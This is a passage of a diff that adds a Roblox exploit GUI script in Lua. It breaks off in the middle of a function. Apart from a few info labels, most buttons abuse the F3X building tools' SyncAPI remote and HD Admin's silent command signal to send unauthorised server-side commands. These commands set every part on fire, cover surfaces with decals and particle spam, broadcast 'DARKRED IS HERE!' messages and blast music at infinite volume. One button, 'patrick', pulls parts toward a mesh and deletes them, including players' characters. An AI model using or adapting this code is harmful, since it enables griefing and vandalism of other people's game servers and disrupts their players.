+		return LocalizationService:GetCountryRegionForPlayerAsync(player)
+	end)
+	
+	if success and countryCode then
+		local successTrans, translator = pcall(function()
+			return LocalizationService:GetTranslatorForPlayerAsync(player)
+		end)
+	
+		if successTrans and translator then
+			local countryName = translator:Translate(textLabel, countryCode)
+			textLabel.Text = "Country: " .. countryName
+		else
+			textLabel.Text = "Country: " .. countryCode
+		end
+	else
+		textLabel.Text = "Country: Unknown"
+	end
+end
+task.spawn(SCRIPT_7)
+-- // StarterGui.ScreenGui.ImageLabel.information.Age days.LocalScript \\ --
+local function SCRIPT_9()
+local script = UI["9"]
+	local Players = game:GetService("Players")
+	local textLabel = script.Parent
+	
+	local player = Players.LocalPlayer
+	
+	textLabel.Text = "Age Days: " .. player.AccountAge
+end
+task.spawn(SCRIPT_9)
+-- // StarterGui.ScreenGui.ImageLabel.information.Game id.LocalScript \\ --
+local function SCRIPT_b()
+local script = UI["b"]
+	local textLabel = script.Parent
+	
+	local gameId = game.GameId
+	
+	textLabel.Text = "Game ID: " .. gameId
+end
+task.spawn(SCRIPT_b)
+-- // StarterGui.ScreenGui.ImageLabel.information.ImageLabel.LocalScript \\ --
+local function SCRIPT_f()
+local script = UI["f"]
+	local Players = game:GetService("Players")
+	local imageLabel = script.Parent
+	
+	local player = Players.LocalPlayer
+	local userId = player.UserId
+	
+	local thumbType = Enum.ThumbnailType.HeadShot
+	local thumbSize = Enum.ThumbnailSize.Size420x420
+	
+	local content, isLoaded = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+	
+	if isLoaded then
+		imageLabel.Image = content
+	end
+end
+task.spawn(SCRIPT_f)
+-- // StarterGui.ScreenGui.ImageLabel.Script.message.LocalScript \\ --
+local function SCRIPT_14()
+local script = UI["14"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";serverMessage DARKRED IS HERE!")
+	end)
+end
+task.spawn(SCRIPT_14)
+-- // StarterGui.ScreenGui.ImageLabel.Script.666.LocalScript \\ --
+local function SCRIPT_16()
+local script = UI["16"]
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+		local backpack = player.Backpack
+		local tool
+	
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			return tool
+		end
+	
+		local activeTool = getf3x()
+		if not activeTool then
+			warn("¡No se encontró la herramienta F3X!")
+			return
+		end
+	
+		local remote = activeTool.SyncAPI.ServerEndpoint
+		local function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		local function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+	
+		local function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function addfire(part)
+			local args = {
+				[1] = "CreateDecorations",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["DecorationType"] = "Fire"
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function syncfire(part, size, heat)
+			local args = {
+				[1] = "SyncDecorate",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["DecorationType"] = "Fire",
+						["Size"] = size or 30,
+						["Heat"] = heat or 35
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function spam(id)
+			for i,v in game.workspace:GetDescendants() do
+				if v:IsA("BasePart") then
+					task.spawn(function()
+						SetLocked(v,false)
+						SpawnDecal(v,Enum.NormalId.Front)
+						AddDecal(v,id,Enum.NormalId.Front)
+	
+						SpawnDecal(v,Enum.NormalId.Back)
+						AddDecal(v,id,Enum.NormalId.Back)
+	
+						SpawnDecal(v,Enum.NormalId.Right)
+						AddDecal(v,id,Enum.NormalId.Right)
+	
+						SpawnDecal(v,Enum.NormalId.Left)
+						AddDecal(v,id,Enum.NormalId.Left)
+	
+						SpawnDecal(v,Enum.NormalId.Bottom)
+						AddDecal(v,id,Enum.NormalId.Bottom)
+	
+						SpawnDecal(v,Enum.NormalId.Top)
+						AddDecal(v,id,Enum.NormalId.Top)
+					end)
+				end
+			end 
+		end
+	
+		local function fireall()
+			for _, v in ipairs(workspace:GetDescendants()) do
+				if v:IsA("BasePart") or v:IsA("UnionOperation") then
+					task.spawn(function()
+						addfire(v)
+						syncfire(v, 30, 35)
+					end)
+				end
+			end
+		end
+	
+		local function runhdadmin()
+			pcall(function()
+				local ReplicatedStorage = game:GetService("ReplicatedStorage")
+				local hdClient = ReplicatedStorage:FindFirstChild("HDAdminHDClient")
+				if hdClient then
+					local signals = hdClient:FindFirstChild("Signals")
+					if signals and signals:FindFirstChild("RequestCommandSilent") then
+						signals.RequestCommandSilent:InvokeServer(";titler all 666.666.666.666")
+						signals.RequestCommandSilent:InvokeServer(";time 0")
+					end
+				end
+			end)
+		end
+	
+		spam("129741903718735")
+		fireall()
+		runhdadmin()
+	end)
+end
+task.spawn(SCRIPT_16)
+-- // StarterGui.ScreenGui.ImageLabel.Script.title me.LocalScript \\ --
+local function SCRIPT_18()
+local script = UI["18"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";titler me DarkRed IS HERE!")
+	end)
+end
+task.spawn(SCRIPT_18)
+-- // StarterGui.ScreenGui.ImageLabel.Script.title all.LocalScript \\ --
+local function SCRIPT_1a()
+local script = UI["1a"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";titler all DarkRed IS HERE!")
+	end)
+end
+task.spawn(SCRIPT_1a)
+-- // StarterGui.ScreenGui.ImageLabel.Script.patrick.LocalScript \\ --
+local function SCRIPT_1c()
+local script = UI["1c"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommandSilent:InvokeServer(";time 5.7")
+	
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+	
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		local function invoke(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		local function applyRedLight(part)
+			if not part or not part:IsA("BasePart") then return end
+			local createArgs = {
+				"CreateLights",
+				{
+					{
+						Part = part,
+						LightType = "PointLight"
+					}
+				}
+			}
+			local syncArgs = {
+				"SyncLighting",
+				{
+					{
+						Part = part,
+						LightType = "PointLight",
+						Color = Color3.fromRGB(255, 0, 0),
+						Range = 60,
+						Brightness = 2
+					}
+				}
+			}
+			invoke(createArgs)
+			invoke(syncArgs)
+		end
+	
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function delete(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			remote:InvokeServer(unpack(args))
+		end
+	
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+	
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+			_(args)
+		end
+	
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+		end
+	
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+	
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color,
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function Krab(id)
+			e = char.HumanoidRootPart.CFrame.x
+			f = char.HumanoidRootPart.CFrame.y
+			g = char.HumanoidRootPart.CFrame.z
+			CreatePart(CFrame.new(math.floor(e), math.floor(f), math.floor(g)) + Vector3.new(0, 53, 0), workspace)
+			for i,v in game.Workspace:GetDescendants() do
+				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
+					SetName(v,"pat")
+					AddMesh(v)
+					SetMesh(v,"455783801")
+					SetTexture(v,id)
+					MeshResize(v,Vector3.new(0.7,0.7,0.7))
+					SetLocked(v,true)
+				end
+			end
+		end
+	
+		Krab("106211613892663")
+	
+		local function getPatPart()
+			for _, v in workspace:GetDescendants() do
+				if v:IsA("BasePart") and v.Name == "pat" then
+					return v
+				end
+			end
+			return nil
+		end
+	
+		local pat = getPatPart()
+		if pat then
+			applyRedLight(pat)
+		end
+	
+		RequestCommandSilent:InvokeServer(";music 7816195044 ;pitch 0.445 ;volume inf")
+	
+		task.delay(19, function()
+			RequestCommandSilent:InvokeServer(";music 9046435309 ;volume inf")
+		end)
+	
+		local function getTargetPart()
+			for _, v in workspace:GetDescendants() do
+				if v:IsA("BasePart") and v.Name == "pat" then
+					return v
+				end
+			end
+			return nil
+		end
+	
+		local function getValidParts(targetPart)
+			local parts = {}
+			for _, v in workspace:GetDescendants() do
+				if v:IsA("BasePart")
+					and v:IsDescendantOf(workspace)
+					and v ~= targetPart
+					and v.Name ~= "Head"
+					and v.Name ~= "Torso"
+					and v.Name ~= "Baseplate"
+					and v.Name ~= "SpawnLocation"
+					and v.Size.X <= 60
+					and v.Size.Z <= 60
+				then
+					table.insert(parts, v)
+				end
+			end
+			return parts
+		end
+	
+		local function movePartToward(part, targetCF)
+			local dir = (targetCF.Position - part.Position).Unit
+			local speed = 1
+			local maxSpeed = 1000
+			local acceleration = 4
+			task.spawn(function()
+				while speed < maxSpeed do
+					speed += acceleration
+					if speed > maxSpeed then speed = maxSpeed end
+					task.wait(0.1)
+				end
+			end)
+			local newCF = CFrame.new(part.Position + dir * speed)
+			MovePart(part, newCF)
+		end
+	
+		task.spawn(function()
+			while true do
+				local target = getTargetPart()
+				if not target then task.wait(0.5) continue end
+				local parts = getValidParts(target)
+				if #parts == 0 then break end
+				local index = 1
+				while index <= #parts do
+					for i = 1, 1 do
+						local part = parts[index]
+						index += 1
+						if not part then break end
+						task.spawn(function()
+							while part and part:IsDescendantOf(workspace) do
+								local distance = (part.Position - target.Position).Magnitude
+	
+								if part.Name == "HumanoidRootPart" and distance <= 14 then
+									local parent = part.Parent
+									if parent then
+										delete(parent)
+									end
+									break
+								elseif distance <= 10 then
+									delete(part)
+									break
+								end
+								SetAnchor(true, part)
+								movePartToward(part, target.CFrame)
+								task.wait(0.05)
+							end
+						end)
+					end
+					task.wait(0.3)
+				end
+				task.wait(1)
+			end
+		end)
+	end)
+end
+task.spawn(SCRIPT_1c)
+-- // StarterGui.ScreenGui.ImageLabel.Script.message 2.LocalScript \\ --
+local function SCRIPT_1e()
+local script = UI["1e"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";serverMessage 1x6xjxG IS THE KING OF THE SERVER")
+	end)
+end
+task.spawn(SCRIPT_1e)
+-- // StarterGui.ScreenGui.ImageLabel.Script.777.LocalScript \\ --
+local function SCRIPT_20()
+local script = UI["20"]
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+		local backpack = player.Backpack
+		local tool
+	
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			return tool
+		end
+	
+		local activeTool = getf3x()
+		if not activeTool then
+			warn("f3x not found, skid")
+			return
+		end
+	
+		local remote = activeTool.SyncAPI.ServerEndpoint
+		local function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		local function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+	
+		local function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function addfire(part)
+			local args = {
+				[1] = "CreateDecorations",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["DecorationType"] = "Fire"
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function syncfire(part, size, heat)
+			local args = {
+				[1] = "SyncDecorate",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["DecorationType"] = "Fire",
+						["Size"] = size or 30,
+						["Heat"] = heat or 35,
+						["Color"] = Color3.fromRGB(148, 0, 211),
+						["SecondaryColor"] = Color3.fromRGB(75, 0, 130)
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function spam(id)
+			for i,v in game.workspace:GetDescendants() do
+				if v:IsA("BasePart") then
+					task.spawn(function()
+						SetLocked(v,false)
+						SpawnDecal(v,Enum.NormalId.Front)
+						AddDecal(v,id,Enum.NormalId.Front)
+	
+						SpawnDecal(v,Enum.NormalId.Back)
+						AddDecal(v,id,Enum.NormalId.Back)
+	
+						SpawnDecal(v,Enum.NormalId.Right)
+						AddDecal(v,id,Enum.NormalId.Right)
+	
+						SpawnDecal(v,Enum.NormalId.Left)
+						AddDecal(v,id,Enum.NormalId.Left)
+	
+						SpawnDecal(v,Enum.NormalId.Bottom)
+						AddDecal(v,id,Enum.NormalId.Bottom)
+	
+						SpawnDecal(v,Enum.NormalId.Top)
+						AddDecal(v,id,Enum.NormalId.Top)
+					end)
+				end
+			end 
+		end
+	
+		local function fireall()
+			for _, v in ipairs(workspace:GetDescendants()) do
+				if v:IsA("BasePart") or v:IsA("UnionOperation") then
+					task.spawn(function()
+						addfire(v)
+						syncfire(v, 30, 35)
+					end)
+				end
+			end
+		end
+	
+		local function runhdadmin()
+			pcall(function()
+				local ReplicatedStorage = game:GetService("ReplicatedStorage")
+				local hdClient = ReplicatedStorage:FindFirstChild("HDAdminHDClient")
+				if hdClient then
+					local signals = hdClient:FindFirstChild("Signals")
+					if signals and signals:FindFirstChild("RequestCommandSilent") then
+						signals.RequestCommandSilent:InvokeServer(";titlep all 777.777.777.777")
+						signals.RequestCommandSilent:InvokeServer(";time 0")
+					end
+				end
+			end)
+		end
+	
+		spam("15224888061")
+		fireall()
+		runhdadmin()
+	end)
+	
+end
+task.spawn(SCRIPT_20)
+-- // StarterGui.ScreenGui.ImageLabel.Script.Particles.LocalScript \\ --
+local function SCRIPT_22()
+local script = UI["22"]
+	local Players = game:GetService("Players")
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+	local player = Players.LocalPlayer
+	local particlesDecalID = "97661894122632"
+	local SPAM_DELAY = 0.03
+	local button = script.Parent
+	
+	local function getF3XRemote()
+		local tool
+		if player.Character then
+			tool = player.Character:FindFirstChild("Building Tools+")
+		end
+		if not tool and player:FindFirstChild("Backpack") then
+			tool = player.Backpack:FindFirstChild("Building Tools+")
+		end
+		if not tool then
+			for _, v in ipairs(player:GetDescendants()) do
+				if v.Name == "SyncAPI" then tool = v.Parent break end
+			end
+		end
+		if not tool then
+			for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
+				if v.Name == "SyncAPI" then tool = v.Parent break end
+			end
+		end
+		if tool then
+			local api = tool:FindFirstChild("SyncAPI")
+			if api then return api:FindFirstChild("ServerEndpoint") end
+		end
+	end
+	
+	local function spamParticles()
+		local remote = getF3XRemote()
+		if not remote then
+			return
+		end
+	
+		local function fire(args) 
+			pcall(function() remote:InvokeServer(unpack(args)) end) 
+		end
+	
+		task.spawn(function()
+			for _, v in ipairs(workspace:GetDescendants()) do
+				if v:IsA("BasePart") then
+					task.spawn(function()
+						fire({"SetLocked", {v}, false})
+						fire({"CreateDecorations", {{Part = v, DecorationType = "ParticleEmitter"}}})
+						fire({"SyncDecorate", {{
+							Part = v, 
+							DecorationType = "ParticleEmitter",
+							Rate = "5000", 
+							SpreadAngle = "18000", 
+							RotSpeed = "10",
+							Texture = "rbxassetid://" .. particlesDecalID, 
+							Speed = "24", 
+							Size = "1"
+						}}})
+					end)
+					task.wait(SPAM_DELAY)
+				end
+			end
+		end)
+	end
+	
+	button.MouseButton1Click:Connect(spamParticles)
+end
+task.spawn(SCRIPT_22)
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox.LocalScript \\ --
+local function SCRIPT_24()
+local script = UI["24"]
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		--craaa
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+	
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+	
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color --[[Color3]],
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+	
+			_(args)
+		end
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function Sky(id)
+			e = char.HumanoidRootPart.CFrame.x
+			f = char.HumanoidRootPart.CFrame.y
+			g = char.HumanoidRootPart.CFrame.z
+			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
+			for i,v in game.Workspace:GetDescendants() do
+				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
+					--spawn(function()
+					SetName(v,"Sky")
+					AddMesh(v)
+					--end)
+					--spawn(function()
+					SetMesh(v,"8006679977")
+					SetTexture(v,id)
+					--end)
+					MeshResize(v,Vector3.new(50,50,50))
+					SetLocked(v,true)
+				end
+			end
+		end
+		Sky("97661894122632")
+	
+	end)
+end
+task.spawn(SCRIPT_24)
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox 2.LocalScript \\ --
+local function SCRIPT_26()
+local script = UI["26"]
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		--craaa
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+	
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+	
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
